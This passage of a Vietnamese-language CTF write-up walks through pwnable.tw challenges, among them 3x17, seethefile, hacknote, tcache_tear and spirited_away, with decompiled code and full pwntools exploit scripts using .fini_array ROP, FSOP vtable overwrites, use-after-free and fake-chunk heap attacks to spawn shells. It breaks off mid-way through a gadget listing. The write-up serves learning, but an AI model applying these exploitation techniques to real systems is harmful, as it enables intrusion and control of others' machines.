print(passowrd.hex())

log_out()

p.sendlineafter(b'>> ',b'1')
p.sendafter(b'passowrd :',b'\x00' + b'b'*71)

p.sendlineafter(b'>> ',b'3')
p.sendafter(b'Copy :',b'a'*8)


libc_leak = bf_libc()
libc_leak = u64(libc_leak[8:].ljust(8,b'\x00'))
print(type(libc_leak))
log.info(f'libc: {hex(libc_leak)}')
libc.address = libc_leak - 0x78439
log.info(f'libc_address: {hex(libc.address)}')
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
oneshot = libc.address + one_gadget[0]
log_out()
payload = flat(
        'a'*0x40,
        passowrd,
        'b'*0x18,
        oneshot
        )
p.sendlineafter(b'>>',b'1')
p.sendafter(b'passowrd :',payload)

log_in()
p.sendlineafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a')

p.sendlineafter(b'>>',b'2')


p.interactive()
```


## 3x17


- vì file bị stripped nên nhìn khá nhức đầu 

![image](/assets/images/Pwnable.tw/43.png)

đây là 1 bài nói về kĩ thuật .fini_array , trước hết ta cần đọc cái https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html này để hiểu về nó

tóm tắt như sau : 

khi 1 chương trình C được khởi động về cơ bản nó hoạt động như sau : 

_start sẽ gọi __libc_start_main và đây là hàm sẽ gọi main() , nó sẽ gồm những đối số sau : 

![image](/assets/images/Pwnable.tw/44.png)

- giải thích về chúng 

![image](/assets/images/Pwnable.tw/45.png)


nói đơn giản , .fini_array là 1 địa chỉ của hàm hủy khi chương trình kết thúc , vậy nếu ta có thể overwrite nó thành cái gì đó , ta hoàn toàn có thể điều khiển luồng thực thi của chương trình


hàm  ```sub_401B6D``` : ta thấy ta được nhập 1 địa chỉ và nhập dữ liệu vào địa chỉ đó

```c
__int64 sub_401B6D()
{
  __int64 result; // rax
  char *v1; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    sub_446EC0(1u, "addr:", 5uLL);
    sub_446E20(0, buf, 0x18uLL);
    v1 = (char *)(int)sub_40EE70(buf);
    sub_446EC0(1u, "data:", 5uLL);
    sub_446E20(0, v1, 0x18uLL);
    result = 0LL;
  }
  if ( __readfsqword(0x28u) != v3 )
    sub_44A3E0();
  return result;
}
```

- vậy trước hết ta cần tìm ra địa chỉ .fini_array , từ hình trên ta có thể hình dung ra được 

```_start, __libc_start_main(main,argc,argv&env,init,fini,rtld_fini```

![image](/assets/images/Pwnable.tw/46.png)


vậy fini sẽ là ```sub_402960``` 

Có thể thấy rằng:
``` 
__libc_csu_init thực thi .init và .init_array
__libc_csu_fini thực thi .fini và .fini_array
```

Và thứ tự thực hiện như sau:

__libc_csu_init
main
__libc_csu_fini

chi tiết hơn như sau : 
```
.init
.init_array[0]
.init_array[1]
…
.init_array[n]
main
.fini_array[n]
…
.fini_array[1]
.fini_array[0]
.fini
```


```__libc_csu_fini```

```
```c
.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o
.text:0000000000402960 ; __unwind {
.text:0000000000402960                 push    rbp
.text:0000000000402961                 lea     rax, unk_4B4100
.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array
.text:000000000040296F                 push    rbx
.text:0000000000402970                 sub     rax, rbp
.text:0000000000402973                 sub     rsp, 8
.text:0000000000402977                 sar     rax, 3
.text:000000000040297B                 jz      short loc_402996
.text:000000000040297D                 lea     rbx, [rax-1]
.text:0000000000402981                 nop     dword ptr [rax+00000000h]
.text:0000000000402988
.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j
.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数
.text:000000000040298C                 sub     rbx, 1
.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh
.text:0000000000402994                 jnz     short loc_402988
.text:0000000000402996
.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j
.text:0000000000402996                 add     rsp, 8
.text:000000000040299A                 pop     rbx
.text:000000000040299B                 pop     rbp
.text:000000000040299C                 jmp     sub_48E32C
.text:000000000040299C ; } // starts at 402960
.text:000000000040299C sub_402960      endp
```

- ta cũng có thể xem mã nguồn libc https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c

```c
__libc_csu_fini (void)
{
#ifndef LIBC_NONSHARED
  size_t i = __fini_array_end - __fini_array_start;
  while (i-- > 0)
    (*__fini_array_start [i]) ();

# ifndef NO_INITFINI
  _fini ();
# endif
#endif
}
```

sơ đồ 

```c
+---------------------+             +---------------------+              +---------------------+             +---------------------+
|                     |             |                     |              |                     |             |                     |
|       main          |  +--------> |  __libc_csu_fini    |  +------->   |  .fini_array[1]     |  +------->  |   .fini_array[0]    |
|                     |             |                     |              |                     |             |                     |
+---------------------+             +---------------------+              +---------------------+             +---------------------+

```

ta sẽ thay đổi luồng thực thi như thế này 

```c
+---------------------+             +---------------------+              +---------------------+             +---------------------+
|                     |             |                     |              |                     |             |                     |
|       main          |  +--------> |  __libc_csu_fini    |  +------->   |  .fini_array[1]     |             |   .fini_array[0]    |
|                     |             |                     |              |  __libc_csu_fini    |             |   main              |
+---------------------+             +---------------------+              +---------------------+             +---------------------+

                                                                                ^          +
                                                                                |          |
                                                                                +----------+
```
tuy nhiên trong bài này có 1 biến toàn cục ```byte_4B9330``` giá trị của nó sẽ luôn tăng (0-256) , vậy tóm tắt flow chương trình sẽ như sau : 

main -> fini -> main ( .fini_array[1]) -> fini ( .fini_array[0]) , từ đây nó sẽ loop và ta có thể nhập được cho các lần sau 

- vậy ý tưởng cuối cùng là build 1 rop_chain , build xong thì dùng ```leave_ret``` vô ```.fini_array[0]``` và đơn giản là nó sẽ nhảy vô chuỗi ```ROP``` của ta ```0x4b4100```

script 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./3x17')

p = process()
"""
gdb.attach(p,gdbscript='''
           b*0x0000000000401C4C
           b*0x0000000000401B9B
           ''')
"""
esp = 0x4B4100
leave_ret = 0x401C4B
fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
pop_rdx =0x0000000000446e35
pop_rsi = 0x0000000000406c30
pop_rdi = 0x0000000000401696
pop_rax = 0x000000000041e4af
syscall = 0x0000000000471db5
def write(addr,data):
        p.recv()
        p.send(str(addr))
        p.recv()
        p.send(data)

input()
write(fini_array,p64(libc_csu_fini)+p64(main_addr))
write(fini_array+ 2*8,p64(pop_rdi) + p64(fini_array+ 11*8))
write(fini_array+ 4*8,p64(pop_rax) + p64(0x3b))
write(fini_array+ 6*8,p64(pop_rsi) + p64(0))
write(fini_array+ 8*8,p64(pop_rdx) + p64(0))
write(fini_array+ 10*8,p64(syscall) + b'/bin/sh\x00')
write(fini_array,p64(leave_ret))

p.interactive()
```

![image](https://hackmd.io/_uploads/BJEFHC1K1x.png)




## seethefile


reverse :  

ta sẽ có 4 option , openfile(),readfile(),writefile(),closefile()



openfile() :

nó sẽ mở 1 file mà ta nhập vào với quyền "r"  và chuỗi ta nhập vaò không chứa chuỗi "flag"

hàm strstr() :  tìm kiếm chuỗi "flag"  trong filename , nếu thấy thì trả về con trỏ đến vị trí đầu tiên , nếu không thấy sẽ trả về NULL 


![image](https://hackmd.io/_uploads/S1sxcyhx1g.png)

readfile() : 

nó kiểm tra con trỏ file FP , nếu FP null thì sẽ trả về 1 chuỗi , nếu không thì nó sẽ read 0x18F byte vào magicbuf
![image](https://hackmd.io/_uploads/rJJxsJhe1e.png)


writefile() :
![image](https://hackmd.io/_uploads/r1V23kheJe.png)

nó sẽ check xem trong chuỗi có chứa các chuỗi trên hay không , nếu có thì nó sẽ exit luôn 

- nếu không thì nó in thằng đó ra 

closefile() : chỉ đơn giản là đóng file 

![image](https://hackmd.io/_uploads/SJLohkne1l.png)


option5  sẽ là nhập vào 1 biến global (name) và sẽ có BOF ở đây 
![image](https://hackmd.io/_uploads/Hkgkayhxye.png)

ta có thể ghi đè được con trỏ file và ở đây có các hàm fclose , fread các kiểu nên ý tưởng sẽ là exploit FSOP 

![image](https://hackmd.io/_uploads/BkGxay3lJl.png)


và ta cũng thấy được phiên bản libc  là 2.23 -> vtable không check , ta có thể ghi đè vtable tới system hoặc là cgi đó 


![image](https://hackmd.io/_uploads/SJtwpk3ekl.png)






exploit :

- đầu tiên ta cần phải leak libc trước , muốn leak libc ta sẽ dùng /proc/self/maps 

giải thích về nó : 

![image](https://hackmd.io/_uploads/HJ6k012xJl.png)

vậy đầu tiên ta sẽ cần mở file và read 2 lần -> sau đó write là sẽ có địa chỉ libc

bước tiếp theo là overwrite vtable thôi 



payload của ta sẽ như sau : 

20 bytes to overwrite name 

overwrite fp bằng fclose 

padding đến fclose 

cấu trúc của fclose sẽ như sau : 

set flags thành chuỗi /bin/sh   

set ._lock  thành địa chỉ chứa giá trị null

set vtable thành địa chỉ chứa địa chỉ system 



script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = remote('chall.pwnable.tw', 10200)
def open(data):
    p.sendlineafter(b'choice :',b'1')
    p.sendlineafter(b'see :',data)

def read():
    p.sendlineafter(b'choice :',b'2')

def write():
    p.sendlineafter(b'choice :',b'3')
open(b'/proc/self/maps')
read()
read()
write()
p.recvline()
leak = int(p.recv(8),16)
print(hex(leak))
libc.address = leak


fp = FileStructure()
fp.flags =  u32(b'/bin')
fp._IO_read_ptr = u32(b'/sh\x00')
fp.vtable = 0x804b284 - 0x44
fp._lock =  0x804bf00


payload = b'a'*0x20
payload += p32(0x804b290)
payload += p32(libc.sym.system)
payload += p32(0)
payload += p32(0)
payload += bytes(fp)
input()
p.sendlineafter(b' choice :',b'5')
p.sendlineafter(b'name :',payload)
#file = FileStructure()#
#file.flags = u32(b'/bin')
#file._IO_read_ptr = u32(b'/sh\x00')
#file._lock = 0x804ba00
#file.vtable = 0x804b284 - 0x44
#payload = flat(
#    b'A'*0x20,
#    0x804b290, libc.sym['system'], 0, 0,
#    bytes(file)
#    )
#p.sendlineafter(b'choice :', b'5')
#p.sendlineafter(b'name :', payload)
#print(file)
p.interactive()



p.interactive()
```

1 cách khác leak libc : https://bluecyber.hashnode.dev/pwnabletw-seethefile
https://pwnable.tw/writeup/9/35917

## silver_bullet 



create_bullet : 

nó kiểm tra xem ta tạo bullet chưa 

tiếp theo nó cho ta read 48 byte và lưu số byte vào s+12 (s+12 sẽ là v7)
![image](https://hackmd.io/_uploads/Sk7-HxheJe.png)


power_up : 

nó check xem v7 có lớn hơn 47 không , nếu không thì ta sẽ được read thêm 48-số byte đã read , tiếp theo nữa là nối byte vừa nhập vào s , ở đây ta cần chú ý là s[48] sẽ chứa 48byte , thằng strcat khi nối chuỗi sẽ thêm byte null vào cuối -> có nghĩa là ta overwrite được 1 byte cho thằng tiếp theo và ta overwrite được thằng v7 
![image](https://hackmd.io/_uploads/HkcrSxhl1x.png)

vậy ta sẽ bypass được đoạn này -> BOF -> ta sẽ leak địa chỉ libc và ret2libc thôi
![image](https://hackmd.io/_uploads/HJjwyZhlkl.png)


-------

hackthenote
------



1 dạng bài UAF điển hình 

addnote : 

đầu tiên nó sẽ gán 1 hàm cho ptr+i , tiếp theo đó là malloc 1 size ta nhập vào và chunk chứa con trỏ đó là ptr_of_note+4 
![image](https://hackmd.io/_uploads/BJlsJ23e1l.png)

ta có thể hình dung như sau : 


![image](https://hackmd.io/_uploads/HJimxn3eJl.png)


print_note : 

nhìn khá phức tạp nhưng vào debug thì nó sẽ kiểu lấy đối số là thằng *note_content để in ra -> ta có thể chèn got vào đây để leak libc 
![image](https://hackmd.io/_uploads/BJvHgn2eye.png)


delete_note : thấy ngay UAF ở đây , nó sẽ free node của ta trước xong rồi free note content 

![image](https://hackmd.io/_uploads/B15cehneyl.png)


exploit



- đầu tiên ta cần phải leak libc trước , sử dụng UAF để chỉnh sửa chunk content trong node đầu thành got của cgi đó , xong dùng print_note để in ra 

- sử dụng UAF tiếp , lúc này thằng print sẽ bị thay bằng system và đối số của nó (chunk content) sẽ bị thay bằng chuỗi ;sh;

- ta cần free 1 chunk tránh khi free nó sẽ gộp chunk

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

#p = process()
p = remote('chall.pwnable.tw', 10102)
#gdb.attach(p,gdbscript='''
#           b*0x0804869a
#           b*0x080486e0
#            b*0x0804872c
#            b*0x080488a5
#            b*0x0804893d
#            b*0x08048863


 #          ''')
def add_note(size,data):
    p.sendlineafter(b'Your choice :',b'1')
    p.sendafter(b'Note size :',size)
    p.sendafter(b'Content :',data)

def delete_note(idx):
    p.sendlineafter(b'choice :',b'2')
    p.sendafter(b'Index :',idx)
def print_note(idx):
    p.sendlineafter(b'choice :',b'3')
    p.sendafter(b'Index :',idx)

input()
add_note(str(0x20),p32(0xdeadbeef))  #idx 0
add_note(str(0x20),p32(0xcafebabe))   #idx  1
delete_note(str(0))
delete_note(str(1))

add_note(str(8),p32(0x0804862b) + p32(exe.got.puts))
print_note(str(0))
leak = u32(p.recv(4))


print("leak: ",hex(leak))

libc.address =  leak - libc.sym.puts
print("libc address: ",hex(libc.address))

delete_note(str(2))
add_note(str(8),p32(libc.sym.system) + b';sh;')
print_note(str(0))





p.interactive()

```

## Tcache_tear



- đầu tiên ta sẽ được read vào `bss` 32 byte , ở bài này ta sẽ có 4 option 

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 option; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  set_init(a1, a2, a3);
  printf("Name:");
  sub_400A25(&unk_602060, 32LL);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      option = read_size();
      if ( option != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( option > 2 )
    {
      if ( option == 3 )
      {
        print_note();
      }
      else
      {
        if ( option == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( option != 1 )
        goto LABEL_14;
      add();
    }
  }
}
```
- option1 : ta sẽ được nhập 1 size <=0xff và malloc với size này , tiếp theo ta sẽ được nhập data vào địa chỉ heap được malloc trả về

```c
int sub_400B14()
{
  unsigned __int64 size_ptr; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  size_ptr = read_size();
  size = size_ptr;
  if ( size_ptr <= 0xFF )
  {
    ptr = malloc(size_ptr);
    printf("Data:");
    sub_400A25(ptr, (unsigned int)(size - 16));
    LODWORD(size_ptr) = puts("Done !");
  }
  return size_ptr;
}
```

- option2 đơn giản là free(ptr)

- option3:  ta sẽ được đọc dữ liệu của `bss`

```c
ssize_t sub_400B99()
{
  printf("Name :");
  return write(1, &unk_602060, 0x20uLL);
}
```

- option4 sẽ thoát chương trình


- vậy bài này ta chỉ có thể malloc 1 chunk duy nhất , nhưng ta có `UAF` và `doublefree` , ở phiên bản libc này sẽ không check `doublefree` và ta có thể thực hiện nó dễ dàng 
- trước hết ta cần suy nghĩ để làm sao leak libc , ta cần libc để có thể lấy shell , ở đây sẽ có 2 cách để leak , đầu tiên sẽ là `Unsorted Bin Attack` 

- the unsorted bin attack cho phép địa chỉ `main arena` được ghi vào 1 địa chỉ tùy ý khi con trỏ bk của chunk được free có thể bị thao túng 
- cách 2 sẽ là tấn công fsop 

- Unsorted Bin Attack: trước hết ta sẽ tận dụng `double free` và ta có thể fake 1 chunk trên bss , ta cần làm là đặt `bk` của chunk đó là `address+0x10` , và khi chunk đó được free , địa chỉ được lưu tại bk-0x10 sẽ chứa địa chỉ của main_arena , và ta kết hợp với option 3 để có thể leak 

- trông nó sẽ như sau: 

```css
 fakechunk = flat(
            0,0x421,
            0,0,
            0,0x0000000000602060+0x10
            )
    input()
    sa(b'Name:',b'kuvee')
    add(0x60,b'aaaa')
    free()
    free()
    add(0x60,p64(0x0000000000602060))
    add(0x60,b'bbbb')
    add(0x60,fakechunk)
    free()
```

![image](https://hackmd.io/_uploads/SkZzbGX6Jx.png)

- tuy nhiên ở đây nó lại lỗi

![image](https://hackmd.io/_uploads/HkqcMfQpkx.png)


```c
nextchunk = chunk_at_offset(p, size);
...
if (__glibc_unlikely (!prev_inuse(nextchunk)))
    malloc_printerr ("double free or corruption (!prev)");

```
- ở đây lỗi xảy ra vì nó check `prev_inuse` của chunk tiếp theo  chưa được setup  vì vậy ta không thể free chunk tương ứng vì có thể bị hỏng do lỗi `df`  , vì vậy ta cần setup nó lại 

- vậy ta cần setup `NAME_BUF + 0x420` setup bit `prev_inuse` đặt thành 1





## Spirited Away

- bài khá là dài nên ta sẽ chú trọng vào những đoạn cần lưu ý 

```c=
int survey()
{
  char v1[56]; // [esp+10h] [ebp-E8h] BYREF
  size_t nbytes; // [esp+48h] [ebp-B0h]
  size_t v3; // [esp+4Ch] [ebp-ACh]
  char comment[80]; // [esp+50h] [ebp-A8h] BYREF
  int age; // [esp+A0h] [ebp-58h] BYREF
  void *name; // [esp+A4h] [ebp-54h]
  char reason[80]; // [esp+A8h] [ebp-50h] BYREF

  nbytes = 60;
  v3 = 80;
LABEL_2:
  memset(comment, 0, sizeof(comment));
  name = malloc(0x3Cu);
  printf("\nPlease enter your name: ");
  fflush(stdout);
  read(0, name, nbytes);
  printf("Please enter your age: ");
  fflush(stdout);
  __isoc99_scanf("%d", &age);
  printf("Why did you came to see this movie? ");
  fflush(stdout);
  read(0, reason, v3);
  fflush(stdout);
  printf("Please enter your comment: ");
  fflush(stdout);
  read(0, comment, nbytes);
  ++cnt;
  printf("Name: %s\n", (const char *)name);
  printf("Age: %d\n", age);
  printf("Reason: %s\n", reason);
  printf("Comment: %s\n\n", comment);
  fflush(stdout);
  sprintf(v1, "%d comment so far. We will review them as soon as we can", cnt);
  puts(v1);
  puts(&s);
  fflush(stdout);
  if ( cnt > 199 )
  {
    puts("200 comments is enough!");
    fflush(stdout);
    exit(0);
  }
  while ( 1 )
  {
    printf("Would you like to leave another comment? <y/n>: ");
    fflush(stdout);
    read(0, &choice, 3u);
    if ( choice == 89 || choice == 121 )
    {
      free(name);
      goto LABEL_2;
    }
    if ( choice == 78 || choice == 110 )
      break;
    puts("Wrong choice.");
    fflush(stdout);
  }
  puts("Bye!");
  return fflush(stdout);
}
```

- trước hết ta sẽ được input name , age , reason , comment các kiểu gì đó và sẽ in ra input của ta , tuy nhiên vì ở đây ta đọc input bằng `read` nên ở đây ta có thể leak gì đó 


```
 printf("Name: %s\n", (const char *)name);
  printf("Age: %d\n", age);
  printf("Reason: %s\n", reason);
  printf("Comment: %s\n\n", comment);
```

- và mỗi lần như thế cnt sẽ tăng lên 1 , tiếp theo sẽ là dùng `sprintf` để đọc dữ liệu vào `v1` , giải thích hàm này hoạt động đơn giản là thay vì in trên màn hình thì nó lưu chuỗi đó vào `v1` , tiếp theo sẽ là chọn thoát chương trình hoặc tiếp tục 

- sau khi thực thi `sprintf` thì stack sẽ trông như này 

![image](https://hackmd.io/_uploads/By0aHOBTyl.png)

- cuối cùng là check xem cnt > 200 chưa và cho ta chọn các option

### exploit

- như đã nói trong lúc phân tích thì ta có thể leak 1 cái gì đó nếu may mắn có libc trên stack , vì PIE bài này tắt nên ta cũng có thể leak thêm stack cho vui 

- tiếp theo sẽ là đoạn này , ở đây nó sẽ lưu số kí tự vào `v1` và kích thước của v1 là 56 bytes , tuy nhiên ta có thể loop đến 199 có nghĩa là ba chữ số và ta có thể thay đổi giá trị của `nbytes` thành 1 gía trị lớn hơn và có thể dẫn đến `bof`

```c
sprintf(v1, "%d comment so far. We will review them as soon as we can", cnt);
```


- sau khi chật vật 1 lúc thì mình đã leak thành công 2 thứ này 

![image](https://hackmd.io/_uploads/HJ6dMtrTJx.png)


- lúc này ta cần loop sao cho count là 1 số có ba chữ số , sau đó nó có thể chuyển từ 60->110 , tuy nhiên thì cũng không đủ `bof` , ý tưởng tiếp theo là overwrite con trỏ thành địa chỉ stack luôn và cuối chương trình nó sẽ free sau đó malloc lại và read tiếp , và vì chunk bây giờ là địa chỉ stack -> `bof` thành công
- nhưng có 1 điều là `tcache` chưa xuất hiện ở libc này , ta đang làm việc với fast-bin nên ta cần fake size cho phù hợp

- như ta thấy mình đã overwrite thành công con trỏ nhưng lúc này size chưa được setup -> lỗi 

![image](https://hackmd.io/_uploads/S1cB2FSTke.png)

![image](https://hackmd.io/_uploads/r1Hw3FHTkl.png)

- sau 1 lúc chật vật thì mình cũng thành công setup cái ề này :))) 

- ta sẽ setup overwrite con trỏ thành địa chỉ stack và setup size phù hợp với khi malloc lại và ta cũng cần setup size cho chunk kế tiếp

![image](https://hackmd.io/_uploads/rkZOc9Sp1x.png)

- và khi chạy script với GDB thì mình có thể lấy shell còn chạy thông thường thì script bị lỗi  , có vẻ là do code lỏ :( 

![image](https://hackmd.io/_uploads/rJSrouLakg.png)


- sau khi tham khảo 1 số script thì có lẽ mình nên `recv` thay thì `sendafter`


![image](https://hackmd.io/_uploads/rknmeFIayg.png)

exp: 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep
context.update(arch="amd64", os="linux")
context.log_level = 'info'

context.log_level = 'debug'
exe = context.binary = ELF('./spirited_away_patched', checksec=False)
libc = exe.libc

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc_base)
def logleak(name, val):  log.info(name+" = %#x" % val)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.ARM:
        return process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b*0x0804868a
b*0x080486bc
b*0x080486f8
b*0x0804873e
b*0x0804875e
b*080487CC
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()
def info(reason,movie,ok=False,end=False):
    global libc_base
    global stack_leak
    sleep(0.7)
    p.sendafter(b'name: ',b'kuvee')
    sleep(0.7)
    p.sendlineafter(b'age: ',b'22')
    sleep(0.7)
    p.sendafter(b'movie? ',reason)
    sleep(0.7)
    p.sendafter(b'comment: ',movie)
    if ok == True:
        pass
    elif ok == 2:
        p.recvuntil(b'Reason: ')
        p.recv(20)
        libc_base = u32(p.recv(4)) - 0x5f29b
        log.info(f'leak: {hex(libc_base)}')
    else:
        p.recvuntil(b'Reason: ')
        p.recvuntil(b'a'*0x38)
        stack_leak = u32(p.recv(4))
        log.info(f'stack leak: {hex(stack_leak)}')

    if end == True:
        sleep(0.7)
        p.sendafter(b'<y/n>: ',b'n')
    else:
        sleep(0.7)
        p.sendafter(b'<y/n>: ',b'y')



def exploit():
    # leak libc
    info(b'a'*20,b'tom',ok=2)
    #leak stack


    info(b'a'*0x38,b'kuvee')
    for i in range(100):
        info(b'a'*5,b'b*10',ok=True)
    target_stack = stack_leak - 0x60
    input("fake chunk")
    p.sendafter(b'name: ',b'kuvee')
    p.sendlineafter(b'age: ',b'22')

    payload = b'a' + p32(0)*2 + p32(0x40) + p32(0)*0xf + p32(0x20)
    payload2 = b'a'*84 + p32(target_stack)

    p.sendafter(b'movie? ',payload)
    p.sendafter(b'comment: ',payload2)
    sa(b'<y/n>: ',b'y')
    pop_esi  = libc_base + 0x00017828
    pop_eax = 0x00023f97 + libc_base
    og = 0x5f065 + libc_base

    input("get shell")
    p.sendafter(b'name: ',b'a'*0x44 + p32(libc_base+0x3a940) + p32(libc_base+ 0x2e7b0) + p32(libc_base + 0x158e8b))
    p.sendafter(b'age: ',b'2')
    p.sendafter(b'movie? ',b'aa')
    p.sendafter(b'comment: ',b'bb')
    p.sendafter(b'<y/n>: ',b'n')








    p.interactive()

if __name__ == '__main__':
    init()
    exploit()
```

## Unexploitable

- lí do mình làm bài này trước các bài khác là vì mình nhìn nó khá là giống bài `ROP` ở đợt ascis vừa rồi , nó không hề có hàm leak nào để leak libc 

- và tất nhiên GOT có thể overwrite được ở bài này 

![image](https://hackmd.io/_uploads/Syr8GYUpJx.png)


- main : nhìn sơ qua thì thấy rõ ràng là có `bof` , nhưng khai thác thế nào? 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  sleep(3u);
  return read(0, buf, 0x100uLL);
}
```

- bài chỉ có `read` và `sleep`

![image](https://hackmd.io/_uploads/rkyczF8Tke.png)

- đây là các gadget có trong bài và tất nhiên là không có `pop rdi` các kiểu 


```css
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x000000000040040a: adc al, byte ptr [rcx]; add byte ptr [rax], al; call 0x2620; add rsp, 8; ret;
0x0000000000400408: add al, ch; adc al, byte ptr [rcx]; add byte ptr [rax], al; call 0x2620; add rsp, 8; ret;
0x0000000000400570: add al, ch; mov edx, 0xc9fffffe; ret;
0x000000000040040d: add al, ch; or eax, 0x48000002; add esp, 8; ret;
0x000000000040060f: add bl, dh; ret;
0x0000000000400496: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x000000000040056e: add byte ptr [rax], al; add al, ch; mov edx, 0xc9fffffe; ret;
0x000000000040060d: add byte ptr [rax], al; add bl, dh; ret;
0x000000000040056d: add byte ptr [rax], al; add byte ptr [rax], al; call 0x2430; leave; ret;
0x0000000000400568: add byte ptr [rax], al; add byte ptr [rax], al; mov eax, 0; call 0x2430; leave; ret;
0x0000000000400569: add byte ptr [rax], al; add byte ptr [rax], bh; call 0x2430; leave; ret;
0x0000000000400411: add byte ptr [rax], al; add rsp, 8; ret;
0x000000000040056f: add byte ptr [rax], al; call 0x2430; leave; ret;
0x0000000000400407: add byte ptr [rax], al; call 0x2520; call 0x2620; add rsp, 8; ret;
0x000000000040040c: add byte ptr [rax], al; call 0x2620; add rsp, 8; ret;
0x000000000040056a: add byte ptr [rax], al; mov eax, 0; call 0x2430; leave; ret;
0x000000000040063e: add byte ptr [rax], al; sub rbx, 8; call rax;
0x0000000000400531: add byte ptr [rax], al; test rax, rax; je 0x2540; pop rbp; mov edi, 0x600e48; jmp rax;
0x000000000040056b: add byte ptr [rax], bh; call 0x2430; leave; ret;
0x000000000040063d: add byte ptr [rax], r8b; sub rbx, 8; call rax;
0x000000000040050b: add byte ptr [rcx], al; add rsp, 8; pop rbx; pop rbp; ret;
0x000000000040040b: add dword ptr [rax], eax; add al, ch; or eax, 0x48000002; add esp, 8; ret;
0x0000000000400492: add eax, 0x200b49; test rax, rax; je 0x249e; call rax;
0x0000000000400492: add eax, 0x200b49; test rax, rax; je 0x249e; call rax; add rsp, 8; ret;
0x0000000000400605: add esp, 0x38; ret;
0x000000000040050e: add esp, 8; pop rbx; pop rbp; ret;
0x0000000000400414: add esp, 8; ret;
0x0000000000400604: add rsp, 0x38; ret;
0x000000000040050d: add rsp, 8; pop rbx; pop rbp; ret;
0x0000000000400413: add rsp, 8; ret;
0x00000000004005f3: and al, 0x18; mov r13, qword ptr [rsp + 0x20]; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005f8: and al, 0x20; mov r14, qword ptr [rsp + 0x28]; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x00000000004005fd: and al, 0x28; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400602: and al, 0x30; add rsp, 0x38; ret;
0x0000000000400495: and byte ptr [rax], al; test rax, rax; je 0x249e; call rax;
0x0000000000400495: and byte ptr [rax], al; test rax, rax; je 0x249e; call rax; add rsp, 8; ret;
0x00000000004005f9: and byte ptr [rbx + rcx*4 + 0x74], cl; and al, 0x28; mov r15, qword ptr [rsp + 0x30]; add rsp, 0x38; ret;
0x0000000000400571: call 0x2430; leave; ret;
0x000000000040065c: call 0x24b0; add rsp, 8; ret;
0x0000000000400409: call 0x2520; call 0x2620; add rsp, 8; ret;
